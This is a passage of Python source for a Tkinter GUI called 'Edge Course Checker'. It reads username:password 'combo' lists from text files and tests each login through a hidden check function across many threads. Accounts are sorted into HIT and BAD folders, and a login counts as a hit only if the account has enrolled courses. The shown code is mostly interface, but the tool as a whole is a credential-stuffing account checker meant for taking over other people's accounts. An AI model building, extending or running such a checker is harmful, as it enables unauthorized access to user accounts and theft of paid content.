        self._boot("log", ("[*] initializing dependency checker", "info"))
        self._boot("log", ("[env] python " + sys.version.split()[0], "dim"))
        self._boot("log", ("[env] " + sys.executable, "dim"))

        self._boot("log", ("[cmd] " + " ".join([sys.executable, "-m", "pip", "--version"]), "cmd"))
        try:
            r = sh([sys.executable, "-m", "pip", "--version"], timeout=60)
            self._boot("log", ((r.stdout or r.stderr).strip(),
                               "ok" if r.returncode == 0 else "err"))
        except Exception as e:
            self._boot("log", ("[!] pip unavailable: " + str(e), "err"))

        outdated = set()
        self._boot("status", "Scanning installed packages\u2026")
        self._boot("log", ("[*] querying PyPI for updates (this needs a moment)\u2026", "info"))
        try:
            r = sh([sys.executable, "-m", "pip", "list", "--outdated", "--format=json"])
            rows = json.loads(r.stdout or "[]")
            for row in rows:
                outdated.add((row.get("name") or "").lower())
            self._boot("log", ("[scan] %d package(s) outdated" % len(rows), "dim"))
        except Exception as e:
            self._boot("log", ("[!] update scan skipped: " + str(e), "warn"))

        all_ok = True
        for i, (pip_name, import_name) in enumerate(deps):
            base = i / n
            step = 1 / n
            self._boot("status", "Checking %s\u2026" % pip_name)
            self._boot("progress", base + step * 0.12)
            installed = None
            if md:
                try:
                    installed = md.version(pip_name)
                except Exception:
                    installed = None
            if installed:
                self._boot("log", ("[dep] %s installed \u2014 %s" % (pip_name, installed), "info"))
            else:
                self._boot("log", ("[dep] %s not found" % pip_name, "warn"))
            self._boot("progress", base + step * 0.25)

            if installed is None:
                self._boot("status", "Installing %s\u2026" % pip_name)
                self._pip([sys.executable, "-m", "pip", "install", pip_name], base + step * 0.6)
            elif pip_name.lower() in outdated:
                self._boot("status", "Updating %s\u2026" % pip_name)
                self._pip([sys.executable, "-m", "pip", "install", "--upgrade", pip_name],
                          base + step * 0.6)
            else:
                self._boot("log", ("[ok] %s is up to date" % pip_name, "ok"))

            self._boot("status", "Loading %s\u2026" % import_name)
            self._boot("progress", base + step * 0.85)
            try:
                globals()[import_name] = importlib.import_module(import_name)
                self._boot("log", ("[ok] imported " + import_name, "ok"))
            except Exception as e:
                all_ok = False
                self._boot("log", ("[!] import failed %s: %s" % (import_name, e), "err"))
            self._boot("progress", base + step)

        self._boot("progress", 1.0)
        self._dep_running = False
        if all_ok:
            self._boot("status", "Ready")
            self._boot("log", ("[done] all set \u2014 starting app", "ok"))
        else:
            self._boot("status", "Starting with limited features")
            self._boot("log", ("[warn] some dependencies unavailable, continuing", "warn"))
        time.sleep(0.8)
        self._boot("done", None)

    def _enter_app(self):
        if self._entered:
            return
        self._entered = True
        try:
            self.boot_host.destroy()
        except Exception:
            pass
        self._build_body()
        self.select_tab(0)
        self.refresh_input_tab()
        self.bind_all("<MouseWheel>", self._on_wheel)
        self.after(120, self._drain_log)

    # ---------- style ----------
    def _setup_style(self):
        s = ttk.Style(self)
        try:
            s.theme_use("clam")
        except tk.TclError:
            pass
        s.configure(".", bg=BG, fg=FG, font=("Segoe UI", 10))
        s.configure("Vertical.TScrollbar", bg=CARD_BG, troughcolor=BG,
                    borderwidth=0, arrowsize=0, relief="flat")
        s.configure("Horizontal.TScrollbar", bg=CARD_BG, troughcolor=BG,
                    borderwidth=0, arrowsize=0, relief="flat")
        s.configure("Console.TScrollbar", bg="#334155", troughcolor=CONSOLE_BG,
                    borderwidth=0, arrowsize=0, relief="flat")
        try:
            s.layout("Console.TScrollbar", s.layout("Vertical.TScrollbar"))
        except tk.TclError:
            pass
        s.configure("Boot.TProgressbar", troughcolor=NAV_TINT, background=ACCENT,
                    borderwidth=0, lightcolor=ACCENT, darkcolor=ACCENT, thickness=10)
        try:
            s.layout("Boot.TProgressbar", s.layout("Horizontal.TProgressbar"))
        except tk.TclError:
            pass

    def card(self, parent, pad=1):
        outer = tk.Frame(parent, bg=BORDER)
        inner = tk.Frame(outer, bg=CARD_BG)
        inner.pack(fill="both", expand=True, padx=pad, pady=pad)
        return outer, inner

    def _scrolled_page(self, root):
        container = tk.Frame(root, bg=BG)
        container.pack(fill="both", expand=True)
        canvas = tk.Canvas(container, bg=BG, highlightthickness=0, bd=0)
        sb = ModernScrollbar(container, command=canvas.yview, bg=BG)
        inner = tk.Frame(canvas, bg=BG)
        win = canvas.create_window((0, 0), window=inner, anchor="nw")
        canvas.configure(yscrollcommand=sb.set)
        canvas.pack(side="left", fill="both", expand=True)
        sb.pack(side="right", fill="y")
        inner.bind("<Configure>",
                   lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.bind("<Configure>",
                    lambda e: canvas.itemconfigure(win, width=e.width))
        return inner, canvas

    def _on_wheel(self, event):
        x, y = self.winfo_pointerxy()
        node = self.winfo_containing(x, y)
        while node is not None:
            if isinstance(node, (tk.Text, tk.Listbox)):
                try:
                    node.yview_scroll(int(-1 * (event.delta / 120)), "units")
                except tk.TclError:
                    pass
                return
            if node is self._active_canvas:
                self._active_canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
                return
            node = getattr(node, "master", None)

    # ---------- top ----------
    def _load_logo(self, px):
        base = _res_dir()
        try:
            from PIL import Image, ImageTk
            im = Image.open(os.path.join(base, "logo.png")).convert("RGBA")
            im = im.resize((px, px), Image.LANCZOS)
            return ImageTk.PhotoImage(im)
        except Exception:
            try:
                ph = tk.PhotoImage(file=os.path.join(base, "logo_256.png"))
                f = max(1, 256 // px)
                return ph.subsample(f, f)
            except Exception:
                return None

    def _build_header(self):
        bar = tk.Frame(self, bg=BG)
        bar.pack(fill="x", padx=32, pady=(24, 12))
        self._logo_img = self._load_logo(34)
        if self._logo_img is not None:
            tk.Label(bar, image=self._logo_img, bg=BG).pack(side="left", padx=(0, 10))
        else:
            tk.Frame(bar, bg=ACCENT, width=11, height=11).pack(side="left", pady=4)
        tk.Label(bar, text="Edge Course", bg=BG, fg=FG,
                 font=("Segoe UI Semibold", 15)).pack(side="left")
        tk.Label(bar, text="Checker", bg=BG, fg=ACCENT,
                 font=("Segoe UI Semibold", 15)).pack(side="left")
        self.author_lbl = tk.Label(bar, text=AUTHOR, bg=BG, fg=ACCENT,
                                    font=("Segoe UI", 9), cursor="hand2")
        self.author_lbl.pack(side="right", pady=4)
        self.author_lbl.bind("<Button-1>", lambda e: webbrowser.open(AUTHOR_URL))
        self.author_lbl.bind("<Enter>",
                             lambda e: self.author_lbl.configure(font=("Segoe UI", 9, "underline")))
        self.author_lbl.bind("<Leave>",
                             lambda e: self.author_lbl.configure(font=("Segoe UI", 9)))

    def _build_header(self):
        pass

    def _build_body(self):
        self.body = tk.Frame(self, bg=BG)
        self.body.pack(fill="both", expand=True)
        self.sidebar = tk.Frame(self.body, bg=CARD_BG, width=214)
        self.sidebar.pack(side="left", fill="y")
        self.sidebar.pack_propagate(False)
        tk.Frame(self.body, bg=BORDER, width=1).pack(side="left", fill="y")
        self._build_sidebar(self.sidebar)
        self.content = tk.Frame(self.body, bg=BG)
        self.content.pack(side="left", fill="both", expand=True)
        self._build_statusbar(self.content)
        self._build_pages()

    def _build_sidebar(self, sb):
        brand = tk.Frame(sb, bg=CARD_BG)
        brand.pack(fill="x", padx=20, pady=(22, 14))
        self._logo_img = self._load_logo(30)
        if self._logo_img is not None:
            tk.Label(brand, image=self._logo_img, bg=CARD_BG).pack(side="left", padx=(0, 11))
        else:
            tk.Frame(brand, bg=ACCENT, width=11, height=11).pack(side="left", pady=4)
        tcol = tk.Frame(brand, bg=CARD_BG)
        tcol.pack(side="left")
        tk.Label(tcol, text="Edge Course", bg=CARD_BG, fg=FG,
                 font=("Segoe UI Semibold", 12)).pack(anchor="w")
        tk.Label(tcol, text="Checker", bg=CARD_BG, fg=ACCENT,
                 font=("Segoe UI Semibold", 12)).pack(anchor="w")

        self._nav = SidebarNav(sb, ("Input", "Output", "Settings"),
                               command=self.select_tab, active=0, bg=CARD_BG)
        self._nav.pack(fill="x", padx=14, pady=(4, 0))

        tk.Frame(sb, bg=CARD_BG).pack(fill="both", expand=True)

        foot = tk.Frame(sb, bg=CARD_BG)
        foot.pack(fill="x", padx=20, pady=(0, 18))
        self.author_lbl = tk.Label(foot, text=AUTHOR, bg=CARD_BG, fg=ACCENT,
                                   font=("Segoe UI", 9), cursor="hand2")
        self.author_lbl.pack(side="left")
        self.author_lbl.bind("<Button-1>", lambda e: webbrowser.open(AUTHOR_URL))
        self.author_lbl.bind("<Enter>",
                             lambda e: self.author_lbl.configure(font=("Segoe UI", 9, "underline")))
        self.author_lbl.bind("<Leave>",
                             lambda e: self.author_lbl.configure(font=("Segoe UI", 9)))

    def _build_pages(self):
        self.page_host = self.content
        self._pages = [tk.Frame(self.page_host, bg=BG) for _ in range(3)]
        self._page_input(self._pages[0])
        self._page_output(self._pages[1])
        self._page_settings(self._pages[2])

    def select_tab(self, idx):
        for p in self._pages:
            p.pack_forget()
        self._pages[idx].pack(fill="both", expand=True)
        self._active_canvas = self._page_canvas.get(idx)
        self._nav.set_active(idx)

    def _build_statusbar(self, parent=None):
        if parent is None:
            parent = self.content
        inner = tk.Frame(parent, bg=BG)
        inner.pack(fill="x", side="top", padx=28, pady=16)
        tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", side="top")
        self.status_badge = Badge(inner, text="Ready", fg=MUTED, fill=NAV_TINT,
                                  outline=BORDER, dot=MUTED, font=("Segoe UI Semibold", 9))
        self.status_badge.pack(side="left")
        self.start_btn = RoundButton(inner, text="Start", style="primary",
                                     command=self.start_check, padx=24, pady=11)
        self.start_btn.pack(side="right")
        self.refresh_btn = RoundButton(inner, text="Refresh", style="ghost",
                                       command=self.refresh_input_tab, padx=24, pady=11)
        self.refresh_btn.pack(side="right", padx=(0, 10))

    # ---------- pages ----------
    def _stat(self, parent, label, color, fill=CARD_BG, outline=BORDER, col=0):
        card = RoundCard(parent, radius=16, fill=fill, outline=outline, bg=BG)
        card.grid(row=0, column=col, sticky="nsew", padx=7, pady=6)
        val = tk.Label(card.inner, text="0", bg=fill, fg=color,
                       font=("Segoe UI Semibold", 26))
        val.pack(anchor="w", padx=22, pady=(18, 2))
        tk.Label(card.inner, text=label.upper(), bg=fill, fg=MUTED,
                 font=("Segoe UI Semibold", 9)).pack(anchor="w", padx=22, pady=(0, 18))
        return val

    def _page_input(self, root):
        inner, canvas = self._scrolled_page(root)
        self._page_canvas[0] = canvas
        wrap = tk.Frame(inner, bg=BG)
        wrap.pack(fill="x", padx=32, pady=26)

        row = tk.Frame(wrap, bg=BG)
        row.pack(fill="x")
        row.rowconfigure(0, weight=1)
        for col in range(4):
            row.columnconfigure(col, weight=1, uniform="stat")
        self.n_files = self._stat(row, "Files", FG, ACCENT_TINT, ACCENT_BD, 0)
        self.n_combos = self._stat(row, "Combos", FG, ACCENT_TINT, ACCENT_BD, 1)
        self.n_hits = self._stat(row, "Hits", HIT_C, HIT_TINT, HIT_BD, 2)
        self.n_bads = self._stat(row, "Bad", BAD_C, BAD_TINT, BAD_BD, 3)

        card = RoundCard(wrap, radius=20, bg=BG)
        card.pack(fill="x", pady=(22, 0))
        head = tk.Frame(card.inner, bg=CARD_BG)
        head.pack(fill="x", padx=24, pady=(20, 16))
        tk.Label(head, text="Detected input files", bg=CARD_BG, fg=FG,
                 font=("Segoe UI Semibold", 13), anchor="w").pack(side="left")
        tools = tk.Frame(head, bg=CARD_BG)
        tools.pack(side="right")
        RoundButton(tools, text="Add more", style="ghost", command=self._add_more,
                    padx=16, pady=8, font=("Segoe UI Semibold", 9)).pack(side="right")
        self.files_badge = Badge(tools, text="0", fg=ACCENT, fill=ACCENT_TINT,
                                 outline=ACCENT_BD, font=("Segoe UI Semibold", 9),
                                 padx=14, pady=7, bg=CARD_BG)
        self.files_badge.pack(side="right", padx=(0, 12))

        box = tk.Frame(card.inner, bg=BORDER)
        box.pack(fill="x", padx=24, pady=(0, 24))
        holder = tk.Frame(box, bg=CARD_BG)
        holder.pack(fill="both", expand=True, padx=1, pady=1)
        self.file_list = tk.Listbox(holder, bg=CARD_BG, fg=FG, highlightthickness=0,
                                    borderwidth=0, font=("Segoe UI", 10), relief="flat",
                                    selectbackground=ACCENT, selectforeground="white",
                                    activestyle="none", height=8)
        self.file_list.pack(side="left", fill="both", expand=True, padx=(12, 0), pady=10)
        sb = ModernScrollbar(holder, command=self.file_list.yview, bg=CARD_BG)
        self.file_list.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y", padx=(4, 10), pady=10)
        self.empty_input = self._placeholder(
            holder, "No input files yet",
            "Drop .txt files into the input folder, or click \u201cAdd more\u201d.",
            bg=CARD_BG)

        self.folder_lbl = tk.Label(wrap, text="", bg=BG, fg=MUTED, font=("Segoe UI", 9))
        self.folder_lbl.pack(anchor="w", pady=(16, 0))

    def _page_output(self, root):
        self._page_canvas[1] = None
        wrap = tk.Frame(root, bg=BG)
        wrap.pack(fill="both", expand=True, padx=32, pady=26)

        card = RoundCard(wrap, radius=20, bg=BG, expand=True)
        card.pack(fill="both", expand=True)
        inner = card.inner
        inner.configure(bg=CARD_BG)

        head = tk.Frame(inner, bg=CARD_BG)
        head.pack(fill="x", padx=22, pady=(18, 12))
        tk.Label(head, text="Activity Log", bg=CARD_BG, fg=FG,
                 font=("Segoe UI Semibold", 13), anchor="w").pack(side="left")
        RoundButton(head, text="Clear", style="ghost", command=self._clear_output,
                    padx=16, pady=7).pack(side="right")
        self.summary_lbl = tk.Label(head, text="idle", bg=NAV_TINT, fg=MUTED,
                                    font=("Segoe UI Semibold", 9), padx=12, pady=5)
        self.summary_lbl.pack(side="right", padx=(0, 10))

        box = tk.Frame(inner, bg=LOG_BORDER)
        box.pack(fill="both", expand=True, padx=22, pady=(0, 22))
        holder = tk.Frame(box, bg=LOG_BG)
        holder.pack(fill="both", expand=True, padx=1, pady=1)
        self.output = tk.Text(holder, bg=LOG_BG, fg=LOG_FG,
                              insertbackground=LOG_FG, relief="flat", bd=0,
                              font=("Consolas", 10), wrap="word", state="disabled",
                              padx=20, pady=18, spacing3=6, highlightthickness=0,
                              selectbackground=ACCENT, selectforeground="white")
        self.output.pack(side="left", fill="both", expand=True)
        sb = ModernScrollbar(holder, command=self.output.yview, bg=LOG_BG,
                             thumb="#cbd5e1", thumb_hover="#94a3b8")
        self.output.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y", padx=(2, 8), pady=8)

        self.empty_output = self._placeholder(
            holder, "No activity yet",
            "Run a check and results will stream here in real time.", bg=LOG_BG)
        self.empty_output.place(relx=0.5, rely=0.5, anchor="center")

        self.output.tag_configure("hit", foreground="#15803d")
        self.output.tag_configure("bad", foreground="#dc2626")
        self.output.tag_configure("err", foreground="#b45309")
        self.output.tag_configure("info", foreground="#64748b")
        self.output.tag_configure("saved", foreground="#0f766e")

    def _section(self, parent, text):
        tk.Label(parent, text=text, bg=CARD_BG, fg=FG,
                 font=("Segoe UI Semibold", 12)).pack(anchor="w", padx=24, pady=(20, 4))

    def _field(self, parent, label, value, folder):
        r = tk.Frame(parent, bg=CARD_BG)
        r.pack(fill="x", padx=24, pady=(6, 6))
        tk.Label(r, text=label, bg=CARD_BG, fg=MUTED,
                 font=("Segoe UI", 9)).pack(anchor="w")
        field = tk.Frame(r, bg=CARD_BG)
        field.pack(fill="x", pady=(4, 0))
        var = tk.StringVar(value=str(value))
        if folder:
            RoundButton(field, text="Browse", style="ghost", padx=16, pady=6,
                        font=("Segoe UI", 9),
                        command=lambda v=var: self._pick_folder(v)).pack(
                side="right", padx=(10, 0))
        eb = tk.Frame(field, bg=BORDER)
        eb.pack(side="left", fill="x", expand=True)
        holder = tk.Frame(eb, bg=CARD_BG)
        holder.pack(fill="both", expand=True, padx=1, pady=1)
        e = tk.Entry(holder, textvariable=var, bg=CARD_BG, fg=FG,
                     insertbackground=ACCENT, relief="flat", font=("Segoe UI", 10))
        e.pack(side="left", fill="both", expand=True, padx=12, ipady=8)
        return var

    def _page_settings(self, root):
        inner, canvas = self._scrolled_page(root)
        self._page_canvas[2] = canvas
        wrap = tk.Frame(inner, bg=BG)
        wrap.pack(fill="x", padx=32, pady=26)

        card = RoundCard(wrap, radius=18, bg=BG)
        card.pack(fill="x")
        folders = card.inner
        self._section(folders, "Folders")
        self.var_input = self._field(folders, "Input folder", INPUT_DIR, True)
        self.var_hit = self._field(folders, "HIT folder", HIT_DIR, True)
        self.var_bad = self._field(folders, "BAD folder", BAD_DIR, True)

        card2 = RoundCard(wrap, radius=18, bg=BG)
        card2.pack(fill="x", pady=(18, 0))
        conn = card2.inner
        self._section(conn, "Request")
        self.var_delay = self._field(conn, "Delay (ms, per worker)", DELAY, False)
        self.var_workers = self._field(conn, "Workers (threads)", WORKERS, False)

        card3 = RoundCard(wrap, radius=18, bg=BG)
        card3.pack(fill="x", pady=(18, 0))
        api = card3.inner
        self._section(api, "API / Endpoints")
        self.var_api = {}
        for name, label in API_KEYS:
            self.var_api[name] = self._field(api, label, globals()[name], False)

        act = tk.Frame(wrap, bg=BG)
        act.pack(fill="x", pady=(20, 0))
        self.saved_lbl = tk.Label(act, text="", bg=BG, fg=HIT_C, font=("Segoe UI", 9))
        self.saved_lbl.pack(side="left")
        RoundButton(act, text="Save settings", style="primary", command=self.save_cfg,
                    padx=22).pack(side="right")

    # ---------- helpers ----------
    def _pick_folder(self, var):
        path = filedialog.askdirectory()
        if path:
            var.set(path)

    def _placeholder(self, parent, title, subtitle, bg=CARD_BG):
        ph = tk.Frame(parent, bg=bg)
        icon = tk.Frame(ph, bg=NAV_TINT, width=58, height=58,
                        highlightbackground=BORDER, highlightthickness=1)
        icon.pack(pady=(0, 14))
        tk.Frame(icon, bg=ACCENT, width=20, height=20).place(
            relx=0.5, rely=0.5, anchor="center")
        tk.Label(ph, text=title, bg=bg, fg=FG,
                 font=("Segoe UI Semibold", 13)).pack()
        tk.Label(ph, text=subtitle, bg=bg, fg=MUTED, font=("Segoe UI", 10),
                 wraplength=320, justify="center").pack(pady=(3, 0))
        return ph

    def _add_more(self):
        files = filedialog.askopenfilenames(
            title="Pick input files",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not files:
            return
        os.makedirs(INPUT_DIR, exist_ok=True)
        copied = 0
        for src in files:
            name = os.path.basename(src)
            dst = os.path.join(INPUT_DIR, name)
            try:
                if os.path.abspath(src) == os.path.abspath(dst):
                    continue
                shutil.copy2(src, dst)
                copied += 1
            except Exception as e:
                messagebox.showerror(APP_TITLE, "Failed to copy %s:\n%s" % (name, e))
        self.refresh_input_tab()
        messagebox.showinfo(APP_TITLE, "Copied %d file(s) into '%s'" % (copied, INPUT_DIR))

    def _update_output_empty(self):
        if not hasattr(self, "empty_output"):
            return
        try:
            empty = not self.output.get("1.0", "end").strip()
        except Exception:
            empty = True
        if empty:
            self.empty_output.place(relx=0.5, rely=0.5, anchor="center")
            self.empty_output.lift()
        else:
            self.empty_output.place_forget()

    def set_status(self, text, color=MUTED):
        self.status_badge.fg = color
        self.status_badge.set_dot(color)
        self.status_badge.set_text(text)

    def log(self, text, tag=None):
        self.log_q.put((text, tag))

    def _drain_log(self):
        got = False
        try:
            while True:
                text, tag = self.log_q.get_nowait()
                got = True
                self.output.configure(state="normal")
                self.output.insert("end", text + "\n", tag)
                if tag != "saved":
                    self.output.insert("end", "\n")
                self.output.see("end")
                self.output.configure(state="disabled")
        except queue.Empty:
            pass
        if got:
            self._update_output_empty()
        self.after(120, self._drain_log)

    def _clear_output(self):
        self.output.configure(state="normal")
        self.output.delete("1.0", "end")
        self.output.configure(state="disabled")
        self._update_output_empty()

    def refresh_input_tab(self):
        files = get_input_files()
        self.file_list.delete(0, "end")
        total = 0
        for f in files:
            self.file_list.insert("end", os.path.basename(f))
            total += len(load_combos_from_file(f))
        self.n_files.configure(text=str(len(files)))
        self.n_combos.configure(text=str(total))
        self.folder_lbl.configure(text=INPUT_DIR)
        self.files_badge.set_text("%d file%s" % (len(files), "" if len(files) == 1 else "s"))
        if len(files) == 0:
            self.empty_input.place(relx=0.5, rely=0.5, anchor="center")
            self.empty_input.lift()
        else:
            self.empty_input.place_forget()

    def save_cfg(self):
        global INPUT_DIR, HIT_DIR, BAD_DIR, DELAY, WORKERS
        try:
            delay = int(float(self.var_delay.get()))
            if delay < 0:
                raise ValueError
        except ValueError:
            messagebox.showerror(APP_TITLE, "Delay must be a number of milliseconds (0 or more)")
            return
        try:
            workers = int(self.var_workers.get())
            if not 1 <= workers <= 64:
                raise ValueError
        except ValueError:
            messagebox.showerror(APP_TITLE, "Workers must be a number between 1 and 64")
            return
        INPUT_DIR = self.var_input.get().strip() or "input"
        HIT_DIR = self.var_hit.get().strip() or os.path.join("results", "HIT")
        BAD_DIR = self.var_bad.get().strip() or os.path.join("results", "BAD")
        DELAY = delay
        WORKERS = workers
        for name, _label in API_KEYS:
            globals()[name] = self.var_api[name].get().strip()
        for d in (INPUT_DIR, HIT_DIR, BAD_DIR):
            os.makedirs(d, exist_ok=True)
        save_settings()
        self.refresh_input_tab()
        self.saved_lbl.configure(text="saved")
        self.after(1600, lambda: self.saved_lbl.configure(text=""))

    # ---------- run ----------
    def start_check(self):
        if self.worker and self.worker.is_alive():
            self.stop_event.set()
            self.start_btn.set_text("Stopping\u2026")
            self.start_btn.set_disabled(True)
            self.set_status("stopping\u2026", ERR_C)
            return
        self.save_cfg()
        self.stop_event.clear()
        self.stats = {"hit": 0, "bad": 0}
        self.n_hits.configure(text="0")
        self.n_bads.configure(text="0")
        self.start_btn.set_text("Stop")
        self.start_btn.set_style("danger")
        self.set_status("running\u2026", ACCENT)
        self.worker = threading.Thread(target=self._run_check, daemon=True)
        self.worker.start()

    def _run_check(self):
        files = get_input_files()
        if not files:
            self.log("[!] no .txt file found inside '%s'" % INPUT_DIR, "err")
            self.after(0, self._finish_run)
            return

        self.log("[*] found %d input file(s)" % len(files), "info")

        tasks = []
        for path in files:
            fname = os.path.basename(path)
            combos = load_combos_from_file(path)
            if not combos:
                self.log("    no valid combo in " + fname, "err")
                continue
            for combo in combos:
                tasks.append((fname, combo))

        nw = max(1, int(WORKERS))
        self.log("[*] %d combo(s) · %d worker(s)" % (len(tasks), nw), "info")

        with ThreadPoolExecutor(max_workers=nw) as pool:
            futures = [pool.submit(self._check_one, f, c) for f, c in tasks]
            for fut in as_completed(futures):
                if self.stop_event.is_set():
                    break
                try:
                    fut.result()
                except Exception as e:
                    self.log("[!] worker error: " + str(e), "err")

        self.after(0, self._finish_run)

    def _check_one(self, fname, combo):
        if self.stop_event.is_set():
            return
        res = check(combo)

        # a login with 0 enrolled courses is not a real hit
        if res["status"] == "hit" and len(res.get("courses") or []) == 0:
            res["status"] = "bad"
            res["error"] = "total enrolled = 0"

        text, tag = format_block(res)
        self.log("[" + fname + "]", "info")
        self.log(text, tag)
        saved_path = write_result(res)
        self.log("[saved] " + saved_path, "saved")

        with self._stats_lock:
            if res["status"] == "hit":
                self.stats["hit"] += 1
            else:
                self.stats["bad"] += 1
        self.after(0, self._update_run_stats)

        if DELAY > 0:
            time.sleep(DELAY / 1000.0)

    def _update_run_stats(self):
        self.n_hits.configure(text=str(self.stats["hit"]))
        self.n_bads.configure(text=str(self.stats["bad"]))

    def _finish_run(self):
        self.start_btn.set_disabled(False)
        self.start_btn.set_text("Start")
        self.start_btn.set_style("primary")
        self.summary_lbl.configure(
            text="hit %d \u00b7 bad/err %d" % (self.stats["hit"], self.stats["bad"]))
        self.set_status("done", HIT_C)

# --------- main ---------

if __name__ == "__main__":
    App().mainloop()
 